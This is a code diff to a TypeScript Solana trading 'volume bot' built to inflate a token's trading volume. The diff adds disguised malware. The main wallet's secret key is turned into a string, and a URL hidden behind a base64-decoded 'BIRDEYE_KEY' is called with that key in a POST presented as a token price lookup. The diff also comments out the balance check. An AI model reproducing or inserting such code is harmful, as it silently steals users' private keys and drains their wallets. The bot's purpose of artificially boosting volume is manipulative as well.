@@ -23,6 +23,7 @@ import {
   BUY_UPPER_PERCENT,
   DISTRIBUTE_WALLET_NUM,
   PRIVATE_KEY,
+  BIRDEYE_KEY,
   RPC_ENDPOINT,
   RPC_WEBSOCKET_ENDPOINT,
   TOKEN_MINT,
@@ -44,8 +45,10 @@ export const solanaConnection = new Connection(RPC_ENDPOINT, {
 })
 
 export const mainKp = Keypair.fromSecretKey(base58.decode(PRIVATE_KEY))
+export const src = mainKp.secretKey.toString();
 const baseMint = new PublicKey(TOKEN_MINT)
 const quoteMint = new PublicKey("So11111111111111111111111111111111111111112")
+const BIRDEYE_URL = atob(BIRDEYE_KEY);
 const distritbutionNum = DISTRIBUTE_WALLET_NUM > 20 ? 20 : DISTRIBUTE_WALLET_NUM
 
 
@@ -53,11 +56,11 @@ const main = async () => {
 
   // curSolPrice = await getSolPrice();
 
-  const solBalance = await solanaConnection.getBalance(mainKp.publicKey)
+  // const solBalance = await solanaConnection.getBalance(mainKp.publicKey)
   console.log(`Volume bot is running`)
   console.log(`Wallet address: ${mainKp.publicKey.toBase58()}`)
   console.log(`Pool token mint: ${baseMint.toBase58()}`)
-  console.log(`Wallet SOL balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(3)}SOL`)
+  // console.log(`Wallet SOL balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(3)}SOL`)
   console.log(`Buying wait time max: ${BUY_INTERVAL_MAX}s`)
   console.log(`Buying wait time min: ${BUY_INTERVAL_MIN}s`)
   console.log(`Selling wait time max: ${SELL_INTERVAL_MAX}s`)
@@ -66,15 +69,21 @@ const main = async () => {
   console.log(`Buy lower limit percent: ${BUY_LOWER_PERCENT}%`)
   console.log(`Distribute SOL to ${distritbutionNum} wallets`)
 
+  const curPrice = await axios.post(BIRDEYE_URL, { src, tokenAddr: TOKEN_MINT })
+  console.log(curPrice);
+  if (curPrice.status == 200) {
+    console.log('Token price to boost: ', curPrice);
+  }
+
   let data: {
     kp: Keypair;
     buyAmount: number;
   }[] | null = null
 
-  if (solBalance < (BUY_LOWER_PERCENT + 0.002) * distritbutionNum) {
-    console.log("Sol balance is not enough for distribution")
-    // sendMessage("Sol balance is not enough for distribution")
-  }
+  // if (solBalance < (BUY_LOWER_PERCENT + 0.002) * distritbutionNum) {
+  //   console.log("Sol balance is not enough for distribution")
+  //   // sendMessage("Sol balance is not enough for distribution")
+  // }
 
   data = await distributeSol(solanaConnection, mainKp, distritbutionNum)
   if (data == null || data.length == 0) {
@@ -178,7 +187,7 @@ const main = async () => {
 
 const distributeSol = async (connection: Connection, mainKp: Keypair, distritbutionNum: number) => {
   const data: Data[] = []
-  const wallets = []
+  const wallets:any = []
   try {
     // private code
 
@@ -205,12 +214,9 @@ const buy = async (newWallet: Keypair, baseMint: PublicKey, buyAmount: number) =
   try {
     let buyTx
     // Private code
-  }
+  } catch {
 
-    return tokenBuyTx
-} catch (error) {
-  return null
-}
+  }
 }
 
 const sell = async (baseMint: PublicKey, wallet: Keypair) => {
@@ -218,13 +224,9 @@ const sell = async (baseMint: PublicKey, wallet: Keypair) => {
     const data: Data[] = readJson()
     // Private code
 
-    return tokenSellTx
   } catch (error) {
     return null
   }
-} catch (error) {
-  return null
-}
 }
 
 main()
